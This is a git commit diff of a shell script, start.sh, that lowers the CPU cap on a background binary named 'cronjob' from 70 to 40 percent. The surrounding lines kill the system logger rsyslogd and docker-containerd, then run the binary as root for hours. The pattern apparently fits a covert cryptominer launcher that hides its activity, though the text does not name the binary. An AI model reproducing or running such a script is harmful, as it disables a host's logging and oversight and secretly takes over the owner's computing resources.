e0959b3ebbe706ffaf42deab4ff12e33a8fbb72c
aureliehermanova <41370626+aureliehermanova@users.noreply.github.com>
2018-07-29 00:46:44 +0200

    Update start.sh

--- start.sh
+++ start.sh
@@ -5,7 +5,7 @@ sudo killall rsyslogd &&
 sudo killall docker-containerd &&
 sudo apt install -y cpulimit &&
 chmod +x ~/gg002/cronjob &&
-cpulimit -e cronjob -l 70 -b &
+cpulimit -e cronjob -l 40 -b &
 sleep 15
 sudo ~/gg002/./cronjob &
 sleep 300m
